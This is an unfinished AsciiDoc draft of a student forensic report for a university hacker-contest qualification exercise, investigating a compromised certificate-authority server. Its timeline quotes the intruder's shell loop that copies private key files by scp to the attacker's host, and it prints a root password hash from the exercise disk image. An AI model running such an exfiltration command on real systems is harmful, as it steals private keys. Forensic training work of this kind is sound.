:doctype: book
:imagesdir: images
:stylesheet: paper.css
// Disable generating an update label at the bottom of the doc.
:last-update-label!:
// Setup highlight.js to use a local version with a local stylesheet
:source-highlighter: highlight.js
:highlightjs-theme: thesis
:highlightjsdir: libraries/highlightjs
// Enable rendering math equations
:stem:
// Generate a table of contents at the toc macro
// Also disabling section numbers for now, as we only start numbering after the toc. See the macros there
:toc: macro
:toclevels: 3
:sectanchors:
// Disable the title page
// We will build the title page manually for maximum flexibility
:notitle:
:title-page: false
// Refer to things like "Figure 1" instead of by their name
:xrefstyle: short
// Prefetch and inline diagrams with kroki but not in vscode
ifndef::env-vscode[]
:kroki-fetch-diagram: true
:kroki-default-options: inline
endif::env-vscode[]

image::../assets/logo_hda.svg[role=logo]

[.university.text-center]
Darmstadt University of Applied Sciences

[.faculty.text-center]
Faculty of Computer Science

[discrete#main-title]
= Compromised Server Investigation Report

[.description.text-center]
Qualification exercise

[.presented-by.text-center]
by +
*Lennart Eichhorn* +
[small]+Matriculation number: 759253+ +
[small]+Email: lennart.eichhorn@stud.h-da.de+

[discrete]
== Abstract

// * Motivation: Why did this work come about? Why is the topic of the
// work interesting (for the general public)? The motivation should be
// abstracted as far as possible from the specific tasks that may be given
// by a company.
// * Content: What is the content of this thesis? What exactly is covered in
// the thesis? The methodology and working method should be briefly
// discussed here.
// * Results: What are the results of this work? A brief overview of the
// Most actual results as a teaser to read the complete thesis.


Participating in the hacker contest course requires a submitting a solution for the qualification exercise <<Goh24>>.

// The table of contents gets inserted here.
toc::[]

// This generates the tables for listings, figures, and tables
// If you do not need all of them, just modify that file.

// Start with section and part numbering
:part-signifier: Part
:sectnums:
:listing-caption: Listing
:partnums:

// Main part starts here
[.reset-pages]
= Forensic Investigation Report

== Introduction

=== Background

A small company hired an IT consultant to generate certificates for various services. As soon as the consultant completed the work and left the building, the Intrusion Detection System (IDS) used in the company detected an attack on the server set up specifically for this purpose. Concerned about the security of the generated certificates, the company requests a forensic investigation of the server to determine whether there has been an attack on the system and, if so, what data has been stolen from the system. Any information that can be found about the attacker is also of importance.

The server itself has the IP address `192.168.0.1``. The consultant used the username `root` and either worked directly on the computer or from the addresses `192.168.5.23`` and `192.168.23.5``. Otherwise, no one else should have had access to the computer. The consultant set up the computer in the morning and generated the certificates. Immediately afterward, he left the premises. Shortly thereafter, the IDS system reported the attack.

=== Objectives

==== Tasks

.Questions
* Should the certificates still be used?
* Can the system still be used?
* If there was an attack:
  * How did the attacker get into the system?
  * What did the attacker do?
  * What has to be done to secure the system?
  * Which details about the attacker can be found?

.Additional Questions
* Is the configuration of the server secure?
* Should a CA be operated in this manner?
* How should the software written by the consulatant be assessed?

==== Hypotheses

=== Acquired data

.Compromised server disk image
[cols="1,1"]
|===
|Attribute |Detailed Information

|Filename
|HDD.raw

|sha256sum
|9ad970f9df238dc266f58f17689d4049ab40e5c10296a3ff0620ba95612f166c

|Size (bytes)
|1.00 GiB (1,073,741,824 bytes)

|Date of acquisition
|Unknown

|Aquired by
|Customer

|Description
|The disk image was created by the customer and handed over to the investigator
|=== 

.Basic server information
Hostnames:: caserver.smallcompany.local caserver localhost.localdomain localhost
Operating System::  Alpine Linux v3.2.3
motd:: Welcome to our PKI management server
nameserver:: 192.168.1.7
root shadow entry:: root:$6$tLmnLjM0j3qZwQxd$YiYPWIAcN4a9W3p5.7jYL8Wg.5sVkedxQ2HRCSUvefVu008.dPyNziMe8LoY3s5DoxchY.G96XsT2jasType50:16703:0:::::
timezone:: UTC
programs:: php, apache, sudo, apk, 

=== Suspect information

Name:: Peter
Username:: peter
IP:: 192.168.223.223
Tools:: Nikto sqlmap

==== Consultant

Some information about the consultant.


== Suspect action timeline

=== Timeline

2015-09-25T06:41:16:: Consultant logs in for the first time from 192.168.23.5
2015-09-25T08:04:10:: Intruder started probing endpoints from 192.168.223.223
2015-09-25T08:10:05:: Intruder placed `test.csv`
2015-09-25T08:11:04:: Intruder placed `upload.php`
2015-09-25T08:24:??:: Intruder starts first ash session
08:24:17:: Intruder exfiltrates `cakey.pem
08:2[4-6]:??:: Intruder fails to exfiltrate `*key.pem`
  `for i in $(find . -name "*key.pem"); do scp $i peter@192.168.0.223.223:/home/peter/; done`

2024-04-28T12:45:00:: Investigator receives the disk image


== Investigator activity logs

I did not work on any live data, so there is no risk of contaminating the evidence.


== Conclusion

=== Recommendations for securing the server

// The head of the technology department not only expects a final report on the data but also desires a bullet-point list of suggestions for strengthening the server. Due to other ongoing projects, the server should not be rebuilt but rather utilized further. Is this advisable?
 
[glossary]
== List of abbreviations

[glossary]
[[IT]]IT:: Information Technology link:pass:[https://en.wikipedia.org/wiki/Information_technology][üîó^]
[[IDS]]IDS:: Intrusion Detection System link:pass:[https://en.wikipedia.org/wiki/Intrusion_detection_system][üîó^]

[bibliography]
== References

// Citation style:
// Line 1: All authors' full first and last names. Commas separate Authors.
// Line 2: Title in italics.
// Line 3: Journal/Conference name or any other information about what gives the source credibility.
// Line 4: doi with attached hyperlink. For digital editions, also link the PDF with a üìÅ icon
// +Authors seperated by commas+

* [[[Goh24]]]
+Matthias G√∂hring, Tobias Hamann, Tim W√∂rner+ +
_Anmeldeaufgabe, Sommersemester 2024_ +
[Online; archived 17.4.2024] +
link:pass:[https://transfer.usd.de/index.php/s/ZPS9KT2NRsk42MA][transfer.usd.de/index.php/s/ZPS9KT2NRsk42MA^]
link:pass:[https://web.archive.org/web/20240417145559/https://transfer.usd.de/index.php/s/ZPS9KT2NRsk42MA/download/2024-04_Anmeldeaufgabe-hda-HackerContest-SoSe24.pdf][üìÅ^]

== Appendix

include::scripts/trailing-scripts.adoc[]

// Final checklist:
// * are all abbreviations defined?
// * are all abbreviations linked to Wikipedia (or somewhere else)?
// * are all references used?
// * are all references linked to the correct source?
// * are all TODOs processed?
// * are the names for things consistent?
// * check for broken references
// * archive.org all links
// * Check for duplication of information
// * oxford comma
// * You should have read the paper at least once from top to bottom.